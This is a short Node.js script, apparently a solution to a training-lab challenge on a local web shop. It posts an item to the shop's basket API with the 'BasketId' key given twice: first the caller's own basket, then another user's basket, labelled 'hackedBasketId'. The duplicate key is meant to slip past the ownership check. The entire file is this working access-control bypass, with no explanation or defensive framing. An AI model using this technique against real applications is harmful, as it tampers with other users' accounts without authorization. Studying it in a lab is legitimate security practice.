const fetch = require('node-fetch');
const authorization = require('./auth');

const productId = 1;
const yourBasketId = 9;
const quantity = 1;
const hackedBasketId = 7;

const basketUrl = 'http://localhost:3000/api/BasketItems/';

async function addToBasket() {
  const body = `{"ProductId":${productId},"BasketId":"${yourBasketId}","quantity":${quantity}, "BasketId":"${hackedBasketId}"}`;
  const method = 'post';
  const headers = {
    'Content-Type': 'application/json',
    'Content-Length': body.length,
    Authorization: authorization,
  };

  const response = await fetch(basketUrl, {
    method,
    body,
    headers,
  });

  const status = await response.statusText;
  console.log(status);
}

(function () {
  addToBasket();
})();
